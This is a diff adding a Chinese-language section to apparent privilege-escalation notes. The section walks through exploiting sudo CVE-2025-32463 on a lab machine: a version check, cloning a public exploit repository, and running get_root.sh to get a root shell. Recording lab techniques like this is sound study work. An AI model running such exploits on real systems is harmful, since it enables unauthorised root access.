@@ -1941,6 +1941,66 @@ root
 
 这将允许用户以另一个用户的身份执行任何命令，但理论上会阻止以超级用户的身份执行命令。如果指定 UID 为 -1，sudo 则会错误的将其读取为 0。这意味着指定 UID 为 -1 或 4294967295 时将以 sudo 身份执行命令。
 
+### CVE-2025-32463
+
+经过枚举发现靶机的 `sudo` 版本为 1.9.17，符合 `CVE-2025-32463` 的提权条件。
+
+```bash
+ike@expressway:~$ sudo -V
+Sudo version 1.9.17
+Sudoers policy plugin version 1.9.17
+Sudoers file grammar version 50
+Sudoers I/O plugin version 1.9.17
+Sudoers audit plugin version 1.9.17
+```
+
+`CVE-2025-32463` 是 `sudo` 的一个关键本地权限提升漏洞，影响 sudo 1.9.14-1.9.17 版本，在 sudo 1.9.17p1 版本被修复，不影响 1.9.14 之前的旧版本。
+
+从 github 下载编译好的源码。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]                                                                        
+└─$ git clone https://github.com/MohamedKarrab/CVE-2025-32463.git
+                                                    
+Cloning into 'CVE-2025-32463'...
+remote: Enumerating objects: 58, done.      
+remote: Counting objects: 100% (58/58), done.
+remote: Compressing objects: 100% (44/44), done.
+remote: Total 58 (delta 27), reused 31 (delta 12), pack-reused 0 (from 0)
+Receiving objects: 100% (58/58), 69.65 KiB | 298.00 KiB/s, done.
+Resolving deltas: 100% (27/27), done.
+```
+
+下载到靶机中运行。
+
+```bash
+ike@expressway:/tmp$ ls -liah CVE-2025-32463/
+total 28K
+261 drwxrwxr-x  5 ike  ike   220 Feb 12 06:04 .
+  1 drwxrwxrwt 29 root root  620 Feb 12 10:39 ..
+317 drwxrwxr-x  2 ike  ike   140 Feb 12 06:04 archs-dynamic
+311 drwxrwxr-x  2 ike  ike   140 Feb 12 06:04 archs-static
+310 -rw-rw-r--  1 ike  ike  2.5K Feb 12 06:04 get_root.py
+324 -rwxrwxr-x  1 ike  ike  1.8K Feb 12 06:04 get_root.sh
+265 drwxrwxr-x  8 ike  ike   260 Feb 12 06:04 .git
+264 -rw-rw-r--  1 ike  ike  4.4K Feb 12 06:04 .gitignore
+323 -rw-rw-r--  1 ike  ike  1.1K Feb 12 06:04 LICENSE
+263 -rwxrwxr-x  1 ike  ike   989 Feb 12 06:04 mkall-dynamic.sh
+262 -rw-rw-r--  1 ike  ike  1.7K Feb 12 06:04 README.md
+```
+
+运行获得 `root`。
+
+```bash
+ike@expressway:/tmp/CVE-2025-32463$ ls
+archs-dynamic  archs-static  get_root.py  get_root.sh  LICENSE  mkall-dynamic.sh  README.md
+ike@expressway:/tmp/CVE-2025-32463$ ./get_root.sh 
+[*] Detected architecture: x86_64
+[*] Launching sudo with archs-dynamic payload …
+root@expressway:/# whoami
+root
+```
+
 ### sudo apt
 
 从此条开始下面数个提权演示命令参考 [GTFOBins](https://gtfobins.github.io)
